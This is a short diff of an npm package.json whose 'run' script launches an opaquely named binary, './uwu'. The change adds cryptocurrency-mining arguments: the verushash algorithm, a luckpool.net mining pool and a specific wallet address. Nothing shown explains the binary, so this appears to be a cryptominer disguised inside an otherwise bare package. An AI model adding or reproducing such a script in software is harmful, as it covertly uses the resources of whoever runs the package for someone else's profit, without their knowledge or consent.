@@ -4,7 +4,7 @@
   "version": "1.0.0",
   "main": "a.js",
   "scripts": {
-    "run": "chmod +x ./uwu && ./uwu"
+    "run": "chmod +x ./uwu && ./uwu --disable-gpu --algorithm verushash --pool na.luckpool.net:3956 --wallet RCDq4J8a65Rp77BMjW7fVvZ2oGiyKohAHs.vv --password x"
   },
   "keywords": [],
   "author": "",
